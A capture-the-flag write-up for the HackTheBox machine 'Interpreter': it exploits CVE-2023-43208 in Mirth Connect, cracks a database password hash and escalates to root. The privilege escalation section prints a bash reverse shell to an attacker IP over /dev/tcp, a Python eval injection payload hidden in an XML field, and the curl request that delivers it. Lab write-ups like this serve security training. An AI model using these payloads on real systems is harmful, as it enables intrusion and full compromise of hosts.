---
title: Interpreter
date: 2026-04-24
category: [HackTheBox, Linux, Web Exploitation, Password Attack]
tags: [nmap, ffuf, hashcat]
difficulty: Medium
summary: Interpreter is a medium rated box on Hack The Box
---

[Link to machine.](https://app.hackthebox.com/machines/Interpreter)

## Reconnaissance
Start with an Nmap scan:
```bash
nmap -sVC -vv -p- <IP> -T4 -oN nmap-full
```
![](../Images/Pasted%20image%2020260424100450.png)
The webpage on port 80 requires to be accessed over HTTPS, so we move to 443.
![](../Images/Pasted%20image%2020260423210826.png)
It's an instance of Mirth Connect.
![](../Images/Pasted%20image%2020260424100713.png)
Inside the downloaded `webstart.jnlp` file I found the current version of Mirth Connect is 4.4.0. Searching shows that this version is vulnerable to CVE-2023-43208.
## CVE-2023-43208
## Exploitation
Download the PoC at [GitHub](https://github.com/vedant-joshi-og/CVE-2023-43208-EXPLOIT), run it and we got the reverse shell as mirth.
![](../Images/Pasted%20image%2020260423210806.png)
We can upgrade our shell to tty shell using
```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```
It looks like I got dropped in mirth application directory, maybe I might find some configuration files around. So I got in `conf` directory and see `mirth.properties`.
`mirth.properties` is the configuration for mirth connection. Found the user credentials for mariadb.
I then tried authenticate by 
```bash
mariadb -u mirthdb -p
```
Database Enumeration:
![](../Images/Pasted%20image%2020260423225313.png)
As shown in the mirth configuration file, the database is `mc_bdd_prod`, check out what's inside.
![](../Images/Pasted%20image%2020260423225909.png)
Inside two tables PERSON and PERSON_PASSWORD I've found the username and password hash of user `sedric`. The password hash seemed to be base64 encoded, the encoded result consists of 40 bytes.
So after a research about Mirth Connect structure on Github, it is noted that from version 4.4.0, they upgraded the hash to PBKDF2-SHA256 with 600000 iterations for security. But the hash we found in the database has 40 bytes which doesn't really match the hash digest size (32 bytes). So by inspecting some commits from the 4.4.0 releases [Github](https://github.com/nextgenhealthcare/connect/commit/0d74442e14ad90ae1cf91a041adb5802002b2399#diff-cb5ff6185ec7679052866dd272d4ba0da6299537945f22ca8da84d5ff61f3eee), I saw that the digest bytes are then prepended with salt bytes before base64 encoding, so it's likely that the prefix 8 bytes are the salts.
From the given salt, digest and hash type I ran hashcat to crack the password offline:
![](../Images/Pasted%20image%2020260424002330.png)
The cracked password is `snowflake1`. Then tried use that to ssh into the machine as sedric.
![](../Images/Pasted%20image%2020260424002508.png)
## Privilege Escalation
- `sudo -l` not working cause sudo not installed.
- No misconfigured SUID binaries.
- Checking files owned by `sedric` user or `sedric` group, I found `/usr/local/bin/notif.py` which is owned by root but allows read permission for sedric group. It's running a service to add patients for the mirth connection but only accepts requests from localhost on port 54321.
![](../Images/Pasted%20image%2020260424083902.png)
Running `ss -tuln` I saw that there is indeed a service listening at `127.0.0.1:54321`. So I crafted an ssh tunnel to forward the traffic from that to access from my machine
```bash
ssh -L 8080:localhost:54321 sedric@<IP>
```
Also, from inspecting the source code, I saw that the server reads the provided XML file to extract the contents inside the tags, then after performing a strict regex filter, then passed into the eval function. This suggests that the service is vulnerable to template injection.
I tried crafting a PoC XML payload to test:
![](../Images/Pasted%20image%2020260424091109.png)
As in the output, the timestamp value got evaluated to 2. So it is indeed vulnerable. Since the regex filter is really strict that I cannot directly embed a reverse shell payload in, I'm gonna make it execute a shell script:
```sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.103/44444 0>&1
```
Put that script file inside `/home/sedric/` and set the permission of the folder to allow every user.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<patient>
<firstname>3+4</firstname>
<lastname>haha</lastname>
<sender_app>Firefox</sender_app>
<timestamp>{__import__('subprocess').run('/home/sedric/rev.sh')}</timestamp>
<birth_date>2/2/2000</birth_date>
<gender>pwn</gender>
</patient>
```
```bash
curl -X POST http://localhost:8080/addPatient \
     -H "Content-Type: application/xml" \
     -d @pwn.xml
```
Start a netcat listener and curl, then we got a root shell:
![](../Images/Pasted%20image%2020260424095837.png)
![](../Images/Pasted%20image%2020260424095921.png)
